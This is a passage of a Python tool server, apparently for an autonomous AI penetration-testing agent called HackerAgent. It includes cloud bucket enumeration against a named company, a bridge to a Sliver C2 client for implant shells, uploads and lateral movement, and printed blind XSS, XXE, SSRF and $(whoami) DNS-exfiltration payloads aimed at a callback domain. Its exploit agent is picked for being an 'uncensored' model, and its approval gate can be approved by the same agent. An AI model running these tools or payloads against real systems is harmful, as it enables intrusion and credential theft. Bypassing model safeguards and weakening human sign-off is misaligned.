    """Cloud asset enumeration — S3 bucket, Azure blob, GCP bucket keşfi.

    Args:
        target: Hedef şirket/domain adı (ör: 'acmecorp', 'example.com')
        providers: Sağlayıcılar (aws, azure, gcp — virgülle ayrılmış)
        extra_args: Ek argümanlar
    """
    outputs = []
    keyword = target.replace(".com", "").replace(".", "-")

    if "aws" in providers:
        # S3 bucket enumeration
        common_patterns = [keyword, f"{keyword}-dev", f"{keyword}-backup", f"{keyword}-prod",
                          f"{keyword}-staging", f"{keyword}-data", f"{keyword}-assets",
                          f"{keyword}-logs", f"{keyword}-uploads", f"{keyword}-static"]
        s3_found = []
        for bucket in common_patterns:
            r = run_command(f"curl -s -o /dev/null -w '%{{http_code}}' https://{bucket}.s3.amazonaws.com/ 2>/dev/null", timeout=5)
            code = r["stdout"].strip()
            if code in ("200", "403"):
                status = "🟢 PUBLIC" if code == "200" else "🟡 EXISTS (403)"
                s3_found.append(f"  {status}: {bucket}.s3.amazonaws.com")
        if s3_found:
            outputs.append("☁️ AWS S3 Buckets:\n" + "\n".join(s3_found))

    if "azure" in providers:
        azure_found = []
        for name in [keyword, f"{keyword}dev", f"{keyword}prod"]:
            r = run_command(f"curl -s -o /dev/null -w '%{{http_code}}' https://{name}.blob.core.windows.net/ 2>/dev/null", timeout=5)
            code = r["stdout"].strip()
            if code != "000" and code != "404":
                azure_found.append(f"  [{code}]: {name}.blob.core.windows.net")
        if azure_found:
            outputs.append("☁️ Azure Blobs:\n" + "\n".join(azure_found))

    if "gcp" in providers:
        gcp_found = []
        for name in [keyword, f"{keyword}-dev", f"{keyword}-data"]:
            r = run_command(f"curl -s -o /dev/null -w '%{{http_code}}' https://storage.googleapis.com/{name}/ 2>/dev/null", timeout=5)
            code = r["stdout"].strip()
            if code in ("200", "403"):
                status = "🟢 PUBLIC" if code == "200" else "🟡 EXISTS"
                gcp_found.append(f"  {status}: storage.googleapis.com/{name}")
        if gcp_found:
            outputs.append("☁️ GCP Buckets:\n" + "\n".join(gcp_found))

    # cloud_enum tool varsa çalıştır
    r = run_command("which cloud_enum 2>/dev/null", timeout=3)
    if r["returncode"] == 0:
        r = run_command(f"cloud_enum -k {shlex.quote(keyword)} {extra_args}", timeout=120)
        if r["stdout"].strip():
            outputs.append(f"🔍 cloud_enum:\n{r['stdout'].strip()[:1500]}")

    return "\n\n".join(outputs) if outputs else f"'{target}' için cloud asset bulunamadı."


@mcp.tool()
def aws_security_check(
    profile: str = "default",
    service: str = "all",
    extra_args: str = ""
) -> str:
    """Prowler/ScoutSuite ile AWS güvenlik denetimi (kendi hesabınız için).

    Args:
        profile: AWS CLI profili
        service: Servis filtresi (all, s3, iam, ec2, rds, lambda)
        extra_args: Ek argümanlar
    """
    # Prowler dene
    r = run_command("which prowler 2>/dev/null", timeout=3)
    if r["returncode"] == 0:
        svc = f"-S {service}" if service != "all" else ""
        cmd = f"prowler aws -p {shlex.quote(profile)} {svc} --severity critical high {extra_args}"
        result = run_command(cmd, timeout=600)
        return format_output(result)

    # ScoutSuite dene
    r = run_command("which scout 2>/dev/null", timeout=3)
    if r["returncode"] == 0:
        cmd = f"scout aws --profile {shlex.quote(profile)} {extra_args}"
        result = run_command(cmd, timeout=600)
        return format_output(result)

    return "HATA: Prowler veya ScoutSuite kurulu değil. pip install prowler-cloud veya scoutsuite"


# ============================================================
# PROFESYONEL RAPOR ÜRETİCİ (v2.0 — Phase 6)
# ============================================================

@mcp.tool()
def generate_pentest_report(
    target: str,
    report_type: str = "executive",
    output_format: str = "markdown"
) -> str:
    """Memory server'daki verilerden otomatik pentest raporu oluştur.
    Knowledge Graph + findings + credentials + endpoints → profesyonel rapor.

    Args:
        target: Hedef IP/domain
        report_type: Rapor tipi ('executive': yönetici özeti, 'full': detaylı, 'findings': sadece bulgular)
        output_format: Çıktı formatı ('markdown', 'json')
    """
    import sqlite3 as _sqlite3

    db_path = os.path.join(CCO_HOME, "agent_memory.db")
    if not os.path.exists(db_path):
        return "HATA: Hafızada veri yok. Önce keşif yapın."

    conn = _sqlite3.connect(db_path)
    conn.row_factory = _sqlite3.Row
    c = conn.cursor()

    # Verileri çek
    findings = [dict(r) for r in c.execute("SELECT * FROM findings WHERE target LIKE ?", (f"%{target}%",))]
    creds = [dict(r) for r in c.execute("SELECT * FROM credentials WHERE target LIKE ?", (f"%{target}%",))]
    endpoints = [dict(r) for r in c.execute("SELECT * FROM endpoints WHERE target LIKE ?", (f"%{target}%",))]
    conn.close()

    if not any([findings, creds, endpoints]):
        return f"'{target}' için hafızada veri bulunamadı."

    # Severity sayımları
    sev_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
    for f in findings:
        sev = f.get("severity", "info").lower()
        sev_counts[sev] = sev_counts.get(sev, 0) + 1

    # Risk skoru hesapla
    risk_score = sev_counts["critical"] * 10 + sev_counts["high"] * 7 + sev_counts["medium"] * 4 + sev_counts["low"] * 1
    risk_level = "KRİTİK" if risk_score >= 30 else "YÜKSEK" if risk_score >= 15 else "ORTA" if risk_score >= 5 else "DÜŞÜK"

    now = datetime.utcnow().strftime("%Y-%m-%d %H:%M UTC")

    if output_format == "json":
        return json.dumps({
            "target": target, "generated_at": now,
            "risk_score": risk_score, "risk_level": risk_level,
            "severity_counts": sev_counts,
            "findings": findings, "credentials_count": len(creds),
            "endpoints_count": len(endpoints)
        }, indent=2, default=str)

    # Markdown rapor
    report = f"""# 🔴 Penetrasyon Testi Raporu

| Alan | Değer |
|------|-------|
| **Hedef** | `{target}` |
| **Tarih** | {now} |
| **Risk Düzeyi** | **{risk_level}** (Skor: {risk_score}) |
| **Agent** | HackerAgent v2.0 |

## Yönetici Özeti

{target} hedefi üzerinde yapılan otomatik penetrasyon testinde toplam **{len(findings)} zafiyet** tespit edilmiştir.

| Severity | Sayı |
|----------|------|
| 🔴 Critical | {sev_counts['critical']} |
| 🟠 High | {sev_counts['high']} |
| 🟡 Medium | {sev_counts['medium']} |
| 🟢 Low | {sev_counts['low']} |
| ⚪ Info | {sev_counts['info']} |

Keşfedilen endpoint sayısı: **{len(endpoints)}**
Ele geçirilen credential sayısı: **{len(creds)}**
"""

    if report_type in ("full", "findings"):
        report += "\n## Detaylı Bulgular\n\n"
        for i, f in enumerate(findings, 1):
            sev_emoji = {"critical": "🔴", "high": "🟠", "medium": "🟡", "low": "🟢"}.get(f.get("severity", "").lower(), "⚪")
            report += f"""### {i}. {sev_emoji} {f.get('type', 'Unknown')} [{f.get('severity', '?').upper()}]

**Açıklama:** {f.get('description', 'N/A')}

**Payload:** `{f.get('payload', 'N/A')}`

**Tarih:** {f.get('timestamp', 'N/A')}

---
"""

    if report_type == "full" and endpoints:
        report += "\n## Keşfedilen Serviser\n\n"
        report += "| Port/URL | Protokol | Durum | Teknolojiler |\n"
        report += "|----------|----------|-------|--------------|\n"
        for ep in endpoints:
            report += f"| {ep.get('url_or_port', '?')} | {ep.get('protocol', '?')} | {ep.get('state', '?')} | {ep.get('technologies', '-')} |\n"

    if report_type == "full" and creds:
        report += f"\n## Ele Geçirilen Credentials ({len(creds)})\n\n"
        report += "| Servis | Kullanıcı | Durum |\n"
        report += "|--------|-----------|-------|\n"
        for cr in creds:
            report += f"| {cr.get('service', '?')} | {cr.get('username', '?')} | ✅ Doğrulandı |\n"

    report += f"""
## Genel Öneriler

1. **Kritik zafiyetleri** derhal yamalayın (24 saat içinde)
2. **High** seviye bulguları 1 hafta içinde düzeltin
3. WAF/IDS kurallarını güncelleyin
4. Düzenli penetrasyon testi programı oluşturun
5. Güvenlik farkındalık eğitimlerini artırın

---
*Bu rapor HackerAgent v2.0 tarafından otomatik oluşturulmuştur.*
*Rapor tarihi: {now}*
"""

    # Dosyaya kaydet
    safe_target = target.replace(".", "_").replace("/", "_")
    report_path = f"/tmp/pentest_report_{safe_target}_{int(time.time())}.md"
    try:
        with open(report_path, "w") as rf:
            rf.write(report)
    except Exception:
        report_path = None

    output = f"📋 Rapor oluşturuldu: {target}\n"
    if report_path:
        output += f"📁 Dosya: {report_path}\n"
    output += f"\n{report}"
    return output


@mcp.tool()
def cvss_calculate(
    av: str = "N", ac: str = "L", pr: str = "N", ui: str = "N",
    s: str = "U", c: str = "H", i: str = "H", a: str = "N"
) -> str:
    """CVSS v3.1 skoru hesapla.

    Args:
        av: Attack Vector (N=Network, A=Adjacent, L=Local, P=Physical)
        ac: Attack Complexity (L=Low, H=High)
        pr: Privileges Required (N=None, L=Low, H=High)
        ui: User Interaction (N=None, R=Required)
        s: Scope (U=Unchanged, C=Changed)
        c: Confidentiality Impact (N=None, L=Low, H=High)
        i: Integrity Impact (N=None, L=Low, H=High)
        a: Availability Impact (N=None, L=Low, H=High)
    """
    # CVSS v3.1 weight tables
    av_weights = {"N": 0.85, "A": 0.62, "L": 0.55, "P": 0.20}
    ac_weights = {"L": 0.77, "H": 0.44}
    pr_weights_unchanged = {"N": 0.85, "L": 0.62, "H": 0.27}
    pr_weights_changed = {"N": 0.85, "L": 0.68, "H": 0.50}
    ui_weights = {"N": 0.85, "R": 0.62}
    cia_weights = {"N": 0.0, "L": 0.22, "H": 0.56}

    pr_weights = pr_weights_changed if s == "C" else pr_weights_unchanged

    exploitability = 8.22 * av_weights.get(av, 0) * ac_weights.get(ac, 0) * pr_weights.get(pr, 0) * ui_weights.get(ui, 0)

    isc_base = 1 - ((1 - cia_weights.get(c, 0)) * (1 - cia_weights.get(i, 0)) * (1 - cia_weights.get(a, 0)))

    if s == "U":
        impact = 6.42 * isc_base
    else:
        impact = 7.52 * (isc_base - 0.029) - 3.25 * ((isc_base - 0.02) ** 15)

    if impact <= 0:
        base_score = 0.0
    elif s == "U":
        base_score = min(impact + exploitability, 10.0)
    else:
        base_score = min(1.08 * (impact + exploitability), 10.0)

    # Yukarı yuvarlama (ceil to 1 decimal)
    import math
    base_score = math.ceil(base_score * 10) / 10

    # Severity
    if base_score >= 9.0:
        severity = "CRITICAL"
    elif base_score >= 7.0:
        severity = "HIGH"
    elif base_score >= 4.0:
        severity = "MEDIUM"
    elif base_score > 0.0:
        severity = "LOW"
    else:
        severity = "NONE"

    vector = f"CVSS:3.1/AV:{av}/AC:{ac}/PR:{pr}/UI:{ui}/S:{s}/C:{c}/I:{i}/A:{a}"

    return f"""📊 CVSS v3.1 Hesaplama
{'='*40}
  Vektör: {vector}
  Skor:   {base_score}
  Seviye: {severity}

  Exploitability: {exploitability:.2f}
  Impact:         {impact:.2f}
"""

# ============================================================
# HUMAN-IN-THE-LOOP APPROVAL ARAÇLARI
# ============================================================

@mcp.tool()
def request_approval(
    operation_type: str,
    description: str,
    target: str,
    payload: str = "",
    risk_level: str = "high"
) -> str:
    """
    Kritik/destructive operasyonlar için human approval iste.
    Exploit çalıştırma, credential kullanma, flag submission, lateral movement gibi
    operasyonlarda MUTLAKA bu tool çağrılmalıdır.
    
    Args:
        operation_type: Operasyon tipi ('exploit', 'credential_use', 'flag_submit', 
                        'destructive', 'lateral_movement', 'persistence', 'data_exfil')
        description: Ne yapılacağının detaylı açıklaması
        target: Hedef sistem/servis
        payload: Kullanılacak payload (varsa)
        risk_level: Risk seviyesi ('low', 'medium', 'high', 'critical')
    """
    _ensure_approval_dir()
    
    approval_id = str(uuid.uuid4())[:8]
    approval_file = os.path.join(APPROVAL_DIR, f"{approval_id}.json")
    
    approval_request = {
        "id": approval_id,
        "operation_type": operation_type,
        "description": description,
        "target": target,
        "payload": payload[:500] if payload else "",  # Payload'ı truncate et
        "risk_level": risk_level,
        "status": "pending",
        "requested_at": datetime.utcnow().isoformat(),
        "decided_at": None,
        "decision": None
    }
    
    with open(approval_file, 'w') as f:
        json.dump(approval_request, f, indent=2)
    
    risk_emoji = {"low": "🟢", "medium": "🟡", "high": "🟠", "critical": "🔴"}.get(risk_level, "🟡")
    
    return f"""\n{risk_emoji} ONAY GEREKLİ [{approval_id}]\n{'='*50}\nOperasyon: {operation_type}\nHedef: {target}\nRisk: {risk_level.upper()}\nAçıklama: {description}\n{'Payload: ' + payload[:200] + '...' if payload else ''}\n{'='*50}\nOnaylamak için: approve_operation(\"{approval_id}\")\nReddetmek için: reject_operation(\"{approval_id}\")\n"""


@mcp.tool()
def approve_operation(approval_id: str, note: str = "") -> str:
    """
    Bekleyen bir operasyonu onayla.
    
    Args:
        approval_id: Onay ID'si (request_approval'dan dönen)
        note: Opsiyonel onay notu
    """
    approval_file = os.path.join(APPROVAL_DIR, f"{approval_id}.json")
    
    if not os.path.exists(approval_file):
        return f"HATA: Onay isteği bulunamadı: {approval_id}"
    
    with open(approval_file, 'r') as f:
        req = json.load(f)
    
    if req["status"] != "pending":
        return f"Bu istek zaten işlenmiş: {req['status']}"
    
    req["status"] = "approved"
    req["decided_at"] = datetime.utcnow().isoformat()
    req["decision"] = f"ONAYLANDI{' — ' + note if note else ''}"
    
    with open(approval_file, 'w') as f:
        json.dump(req, f, indent=2)
    
    return f"✅ Operasyon ONAYLANDI [{approval_id}]: {req['operation_type']} → {req['target']}"


@mcp.tool()
def reject_operation(approval_id: str, reason: str = "") -> str:
    """
    Bekleyen bir operasyonu reddet.
    
    Args:
        approval_id: Onay ID'si
        reason: Red gerekçesi
    """
    approval_file = os.path.join(APPROVAL_DIR, f"{approval_id}.json")
    
    if not os.path.exists(approval_file):
        return f"HATA: Onay isteği bulunamadı: {approval_id}"
    
    with open(approval_file, 'r') as f:
        req = json.load(f)
    
    if req["status"] != "pending":
        return f"Bu istek zaten işlenmiş: {req['status']}"
    
    req["status"] = "rejected"
    req["decided_at"] = datetime.utcnow().isoformat()
    req["decision"] = f"REDDEDİLDİ{' — ' + reason if reason else ''}"
    
    with open(approval_file, 'w') as f:
        json.dump(req, f, indent=2)
    
    return f"❌ Operasyon REDDEDİLDİ [{approval_id}]: {req['operation_type']} → {req['target']}"


@mcp.tool()
def check_approval(approval_id: str) -> str:
    """
    Bir onay isteğinin durumunu kontrol et.
    
    Args:
        approval_id: Onay ID'si
    """
    approval_file = os.path.join(APPROVAL_DIR, f"{approval_id}.json")
    
    if not os.path.exists(approval_file):
        return f"HATA: Onay isteği bulunamadı: {approval_id}"
    
    with open(approval_file, 'r') as f:
        req = json.load(f)
    
    status_emoji = {"pending": "⏳", "approved": "✅", "rejected": "❌"}.get(req["status"], "❓")
    
    return f"{status_emoji} Onay [{approval_id}]: {req['status'].upper()} | {req['operation_type']} → {req['target']}"


@mcp.tool()
def list_pending_approvals() -> str:
    """Tüm bekleyen onay isteklerini listele."""
    _ensure_approval_dir()
    
    pending = []
    for fname in os.listdir(APPROVAL_DIR):
        if not fname.endswith(".json"):
            continue
        fpath = os.path.join(APPROVAL_DIR, fname)
        try:
            with open(fpath, 'r') as f:
                req = json.load(f)
            if req.get("status") == "pending":
                pending.append(req)
        except Exception:
            continue
    
    if not pending:
        return "Bekleyen onay isteği bulunmuyor."
    
    output = f"⏳ Bekleyen Onaylar ({len(pending)}):\n{'='*50}\n"
    for req in sorted(pending, key=lambda x: x.get("requested_at", "")):
        risk_emoji = {"low": "🟢", "medium": "🟡", "high": "🟠", "critical": "🔴"}.get(req.get("risk_level", ""), "🟡")
        output += f"{risk_emoji} [{req['id']}] {req['operation_type']} → {req['target']}\n"
        output += f"   {req['description'][:80]}\n"
    
    return output


# ============================================================
# SERVER BAŞLAT
# ============================================================
# SWARM ORCHESTRATOR TOOL'LARI (v2.0 — Phase 5)
# ============================================================

@mcp.tool()
def swarm_dispatch(
    task_description: str,
    roles: str = "recon",
    target: str = ""
) -> str:
    """Multi-agent swarm'a görev gönder.
    Her agent kendi context window'unda paralel çalışır.

    Args:
        task_description: Görev açıklaması
        roles: Agent rolleri (virgülle ayrılmış):
            - recon: Keşif (Qwen — ucuz, hızlı)
            - exploit: Exploit üretimi (Hermes 405B — sansürsüz)
            - validate: Doğrulama (Qwen — dikkatli)
            - report: Raporlama (Qwen — formatlı)
        target: Hedef bilgisi (opsiyonel)
    """
    try:
        sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "..", "scripts"))
        from swarm_orchestrator import SwarmOrchestrator, AgentRole

        orch = SwarmOrchestrator()
        role_list = [AgentRole(r.strip()) for r in roles.split(",") if r.strip()]

        if not role_list:
            return "HATA: Geçerli rol belirtilmedi. Kullanın: recon, exploit, validate, report"

        context = {"target": target} if target else {}

        if len(role_list) == 1:
            tid = orch.create_task(role_list[0], task_description, context)
            result = orch.execute_task(tid)
            return f"🤖 [{role_list[0].value.upper()}] Agent tamamlandı\n{'='*50}\n{result}"
        else:
            tasks = [(role, task_description, context) for role in role_list]
            results = orch.dispatch_parallel(tasks)

            output = f"⚡ SWARM TAMAMLANDI ({len(results)} agent)\n{'='*60}\n"
            for tid, result in results.items():
                output += f"\n{'─'*50}\n🤖 [{tid}]\n{'─'*50}\n{result[:1500]}\n"
            return output
    except ImportError:
        return "HATA: swarm_orchestrator.py bulunamadı. scripts/ dizinini kontrol edin."
    except Exception as e:
        return f"HATA: Swarm çalıştırılamadı: {e}"


@mcp.tool()
def swarm_chain(
    task_description: str,
    chain: str = "recon,exploit,validate,report",
    target: str = ""
) -> str:
    """Agent zinciri çalıştır — her agent öncekinin çıktısını alır.
    recon → exploit → validate → report pipeline'ı.

    Args:
        task_description: Başlangıç görevi
        chain: Agent zinciri (virgülle ayrılmış, sıralı handoff)
        target: Hedef bilgisi
    """
    try:
        sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "..", "scripts"))
        from swarm_orchestrator import SwarmOrchestrator, AgentRole

        orch = SwarmOrchestrator()
        chain_roles = [AgentRole(r.strip()) for r in chain.split(",") if r.strip()]
        context = {"target": target} if target else {}

        output = f"🔗 AGENT CHAIN: {' → '.join(r.value for r in chain_roles)}\n{'='*60}\n"
        prev_result = ""

        for i, role in enumerate(chain_roles):
            prompt = task_description if i == 0 else f"Önceki agent çıktısına göre görevini yap:\n{prev_result[:2000]}"
            if prev_result:
                context["previous_output"] = prev_result[:2000]

            tid = orch.create_task(role, prompt, context)
            result = orch.execute_task(tid)

            output += f"\n{'─'*50}\n#{i+1} 🤖 [{role.value.upper()}]\n{'─'*50}\n{result[:1000]}\n"
            prev_result = result

        return output
    except Exception as e:
        return f"HATA: Agent chain çalıştırılamadı: {e}"


# ============================================================
# C2 BRIDGE (v2.0 — Phase 5)
# ============================================================

@mcp.tool()
def sliver_command(
    command: str,
    session: str = "",
    extra_args: str = ""
) -> str:
    """Sliver C2 framework ile etkileşim.
    İmplant yönetimi, beacon kontrol, lateral movement.

    Args:
        command: Sliver komutu (sessions, use, execute, upload, download, 
                 pivots, portfwd, socks5, shell, screenshot)
        session: Session ID (opsiyonel)
        extra_args: Ek argümanlar
    """
    session_part = f"--session {shlex.quote(session)}" if session else ""

    if command == "sessions":
        cmd = "sliver-client sessions"
    elif command in ("beacons", "implants", "jobs"):
        cmd = f"sliver-client {command}"
    elif session and command in ("execute", "shell", "upload", "download", "screenshot", "portfwd"):
        cmd = f"sliver-client {session_part} {command} {extra_args}"
    else:
        cmd = f"sliver-client {command} {session_part} {extra_args}"

    result = run_command(cmd, timeout=30)
    return format_output(result)


@mcp.tool()
def self_improve(
    engagement_summary: str,
    findings_count: int = 0,
    success_rate: float = 0.0,
    lessons_learned: str = ""
) -> str:
    """Engagement sonrası öz-değerlendirme ve iyileştirme notu kaydet.
    Sonraki engagement'larda RAG ile benzer hedefler için kullanılır.

    Args:
        engagement_summary: Engagement özeti
        findings_count: Bulunan toplam zafiyet sayısı
        success_rate: Başarı oranı (0.0-1.0)
        lessons_learned: Öğrenilen dersler
    """
    improvement_log = os.path.join(CCO_HOME, "improvement_log.json")

    try:
        if os.path.exists(improvement_log):
            with open(improvement_log, 'r') as f:
                logs = json.load(f)
        else:
            logs = []

        entry = {
            "timestamp": datetime.utcnow().isoformat(),
            "summary": engagement_summary,
            "findings_count": findings_count,
            "success_rate": success_rate,
            "lessons_learned": lessons_learned,
            "version": "2.0"
        }
        logs.append(entry)

        os.makedirs(os.path.dirname(improvement_log), exist_ok=True)
        with open(improvement_log, 'w') as f:
            json.dump(logs, f, indent=2)

        total_engagements = len(logs)
        avg_findings = sum(log.get("findings_count", 0) for log in logs) / max(total_engagements, 1)
        avg_success = sum(log.get("success_rate", 0) for log in logs) / max(total_engagements, 1)

        return f"""📊 Self-Improvement Log Güncellendi
{'='*40}
  Toplam engagement: {total_engagements}
  Ortalama finding: {avg_findings:.1f}
  Ortalama başarı: {avg_success:.1%}
  Son ders: {lessons_learned[:200]}

  💾 Log: {improvement_log}"""
    except Exception as e:
        return f"HATA: Log kaydedilemedi: {e}"


# ============================================================
# OOB CALLBACK SERVER — Blind Vulnerability Detection (Phase 7)
# ============================================================

# Global interactsh state
_interactsh_sessions = {}

@mcp.tool()
def interactsh_start(
    session_name: str = "default"
) -> str:
    """Interactsh callback sunucusu başlat — Blind SSRF, Blind XSS, Blind XXE tespiti için.
    Bu sunucu benzersiz bir subdomain üretir. Bu subdomain'i payload'lara gömün,
    eğer hedef sunucu bu adrese istek yaparsa → zafiyet doğrulanır.

    Args:
        session_name: Oturum adı (birden fazla paralel test için)
    """
    # interactsh-client kurulu mu?
    r = run_command("which interactsh-client 2>/dev/null", timeout=5)
    if r["returncode"] != 0:
        return ("HATA: interactsh-client kurulu değil.\n"
                "Kurulum: go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest\n"
                "veya: apt install interactsh -y")

    # Önceki session varsa kullan
    if session_name in _interactsh_sessions:
        info = _interactsh_sessions[session_name]
        return f"⚡ Mevcut session kullanılıyor: {session_name}\n🌐 OOB Domain: {info.get('domain', '?')}\nPID: {info.get('pid', '?')}"

    log_file = f"/tmp/interactsh_{session_name}_{int(time.time())}.log"

    try:
        proc = subprocess.Popen(
            ["interactsh-client", "-json", "-o", log_file, "-poll-interval", "3"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )

        # İlk URL'yi yakala (2-3 saniye bekle)
        time.sleep(3)

        domain = ""
        # Log dosyasından veya stdout'tan domain'i çıkar
        try:
            with open(log_file, 'r') as f:
                content = f.read()
                # interactsh çıktısından domain'i parse et
                for line in content.split("\n"):
                    if "interact.sh" in line or "oast" in line:
                        # JSON çıktısından domain çıkar
                        try:
                            data = json.loads(line)
                            domain = data.get("full-id", data.get("unique-id", ""))
                        except json.JSONDecodeError:
                            # Düz text'ten çıkar
                            import re as _re
                            match = _re.search(r'([a-z0-9]+\.(?:interact\.sh|oast\.[a-z]+))', line)
                            if match:
                                domain = match.group(1)
        except FileNotFoundError:
            pass

        if not domain:
            # stderr'den çıkar
            try:
                stderr_line = proc.stderr.readline()
                if "interact.sh" in stderr_line or "oast" in stderr_line:
                    import re as _re
                    match = _re.search(r'([a-z0-9]+\.(?:interact\.sh|oast\.[a-z]+))', stderr_line)
                    if match:
                        domain = match.group(1)
            except Exception:
                pass

        _interactsh_sessions[session_name] = {
            "pid": proc.pid,
            "process": proc,
            "log_file": log_file,
            "domain": domain,
            "started_at": datetime.utcnow().isoformat()
        }

        return f"""🟢 Interactsh Callback Server BAŞLATILDI
{'='*55}
  Session: {session_name}
  🌐 OOB Domain: {domain or '(log dosyasından kontrol edin: ' + log_file + ')'}
  PID: {proc.pid}
  Log: {log_file}

📌 KULLANIM — Bu domain'i payload'lara gömün:
  Blind SSRF:  http://{domain or 'YOUR_DOMAIN'}
  Blind XSS:   <img src=http://{domain or 'YOUR_DOMAIN'}>
  Blind XXE:   <!ENTITY xxe SYSTEM "http://{domain or 'YOUR_DOMAIN'}">
  DNS exfil:   $(whoami).{domain or 'YOUR_DOMAIN'}

Sonuçları kontrol etmek için: interactsh_poll("{session_name}")
"""
    except Exception as e:
        return f"HATA: Interactsh başlatılamadı: {e}"


@mcp.tool()
def interactsh_poll(
    session_name: str = "default"
) -> str:
    """Interactsh callback'lerini kontrol et — hedeften gelen istekleri göster.
    Bir callback geldi = Blind zafiyet DOĞRULANDI!

    Args:
        session_name: Oturum adı
    """
    info = _interactsh_sessions.get(session_name)
    if not info:
        return f"HATA: '{session_name}' session bulunamadı. Önce interactsh_start() çalıştırın."

    log_file = info.get("log_file", "")
    if not os.path.exists(log_file):
        return "Henüz callback alınmadı (log dosyası boş)."

    try:
        with open(log_file, 'r') as f:
            content = f.read().strip()

        if not content:
            return "⏳ Henüz callback alınmadı. Payload'ların hedefte tetiklenmesini bekleyin."

        # JSON satırlarını parse et
        interactions = []
        for line in content.split("\n"):
            line = line.strip()
            if not line:
                continue
            try:
                data = json.loads(line)
                interactions.append(data)
            except json.JSONDecodeError:
                continue

        if not interactions:
            return "⏳ Henüz callback alınmadı."

        output = f"🔔 CALLBACK TESPİT EDİLDİ! ({len(interactions)} etkileşim)\n{'='*55}\n"
        for i, data in enumerate(interactions[-20:], 1):  # Son 20 callback
            proto = data.get("protocol", "?")
            remote = data.get("remote-address", "?")
            raw_req = data.get("raw-request", "")[:300]
            timestamp = data.get("timestamp", "?")

            output += f"\n#{i} [{proto.upper()}] {remote} @ {timestamp}\n"
            if raw_req:
                output += f"  Request: {raw_req}...\n"

        output += "\n🎯 SONUÇ: Hedef sunucu OOB callback gönderdi → Blind zafiyet DOĞRULANDI!\n"
        return output
    except Exception as e:
        return f"HATA: Log okunamadı: {e}"


@mcp.tool()
def interactsh_stop(
    session_name: str = "default"
) -> str:
    """Interactsh oturumunu durdur ve sonuçları özetle.

    Args:
        session_name: Oturum adı
    """
    info = _interactsh_sessions.get(session_name)
    if not info:
        return f"Session bulunamadı: {session_name}"

    proc = info.get("process")
    if proc:
        try:
            proc.terminate()
            proc.wait(timeout=5)
        except Exception:
            try:
                proc.kill()
            except Exception:
                pass

    # Son kez sonuçları oku
    result = interactsh_poll(session_name)

    del _interactsh_sessions[session_name]
    return f"🔴 Interactsh session '{session_name}' DURDURULDU.\n\n{result}"


# ============================================================
# HEADLESS BROWSER — DOM XSS, Auth Flow, JS Analysis (Phase 7)
# ============================================================

@mcp.tool()
def browser_crawl(
    url: str,
    max_pages: int = 20,
    timeout: int = 60,
    extract_forms: bool = True,
    extract_links: bool = True,
    extract_js: bool = True
) -> str:
    """Playwright ile headless browser crawling — JS rendered sayfaları analiz et.
    SPA'lar, React/Vue/Angular uygulamalar için kritik.

    Args:
        url: Başlangıç URL'si
        max_pages: Maksimum sayfa sayısı
        timeout: Toplam zaman aşımı (saniye)
        extract_forms: Form'ları çıkar (input noktaları)
        extract_links: Tüm link'leri çıkar
        extract_js: JS dosyalarını listele
    """
    script = f'''
import asyncio
from playwright.async_api import async_playwright
import json, sys

async def crawl():
    results = {{"pages": [], "forms": [], "links": set(), "js_files": set(), "errors": []}}
    visited = set()
    to_visit = ["{url}"]
    base_domain = "{url}".split("//")[-1].split("/")[0].split(":")[0]

    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True, args=["--no-sandbox"])
        context = await browser.new_context(
            user_agent="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            ignore_https_errors=True
        )
        page = await context.new_page()

        while to_visit and len(visited) < {max_pages}:
            current = to_visit.pop(0)
            if current in visited:
                continue
            visited.add(current)

            try:
                resp = await page.goto(current, wait_until="networkidle", timeout=15000)
                status = resp.status if resp else 0
                title = await page.title()

                page_info = {{"url": current, "status": status, "title": title}}
                results["pages"].append(page_info)

                # Form'ları çıkar
                if {str(extract_forms).lower()}:
                    forms = await page.query_selector_all("form")
                    for form in forms:
                        action = await form.get_attribute("action") or ""
                        method = await form.get_attribute("method") or "GET"
                        inputs = await form.query_selector_all("input, textarea, select")
                        fields = []
                        for inp in inputs:
                            name = await inp.get_attribute("name") or ""
                            typ = await inp.get_attribute("type") or "text"
                            if name:
                                fields.append({{"name": name, "type": typ}})
                        if fields:
                            results["forms"].append({{
                                "page": current, "action": action,
                                "method": method.upper(), "fields": fields
                            }})

                # Link'leri çıkar
                if {str(extract_links).lower()}:
                    anchors = await page.query_selector_all("a[href]")
                    for a in anchors:
                        href = await a.get_attribute("href")
                        if href and not href.startswith(("#", "javascript:", "mailto:")):
                            if href.startswith("/"):
                                href = "{url}".rstrip("/") + href
                            if base_domain in href and href not in visited:
                                results["links"].add(href)
                                if len(to_visit) < {max_pages} * 2:
                                    to_visit.append(href)

                # JS dosyalarını çıkar
                if {str(extract_js).lower()}:
                    scripts = await page.query_selector_all("script[src]")
                    for s in scripts:
                        src = await s.get_attribute("src")
                        if src:
                            if src.startswith("/"):
                                src = "{url}".rstrip("/") + src
                            results["js_files"].add(src)

            except Exception as e:
                results["errors"].append({{"url": current, "error": str(e)[:100]}})

        await browser.close()

    results["links"] = list(results["links"])
    results["js_files"] = list(results["js_files"])
    print(json.dumps(results, indent=2))

asyncio.run(crawl())
'''

    script_path = tempfile.mktemp(suffix=".py")
    with open(script_path, "w") as f:
        f.write(script)

    result = run_command(f"python3 {script_path}", timeout=timeout + 10)
    try:
        os.unlink(script_path)
    except Exception:
        pass

    if not result["success"]:
        if "playwright" in result["stderr"].lower() or "No module" in result["stderr"]:
            return ("HATA: Playwright kurulu değil.\n"
                    "Kurulum:\n  pip3 install playwright\n  playwright install chromium\n\n"
                    f"Detay: {result['stderr'][:300]}")
        return format_output(result)

    try:
        data = json.loads(result["stdout"])
        output = f"🌐 Browser Crawl Sonuçları: {url}\n{'='*55}\n"
        output += f"📄 Sayfalar: {len(data.get('pages', []))}\n"
        output += f"📝 Formlar: {len(data.get('forms', []))}\n"
        output += f"🔗 Link'ler: {len(data.get('links', []))}\n"
        output += f"📜 JS Dosyaları: {len(data.get('js_files', []))}\n"

        # Sayfalar
        if data.get("pages"):
            output += f"\n{'─'*50}\n📄 Keşfedilen Sayfalar:\n"
            for p in data["pages"]:
                output += f"  [{p['status']}] {p['url']} — {p.get('title', '')}\n"

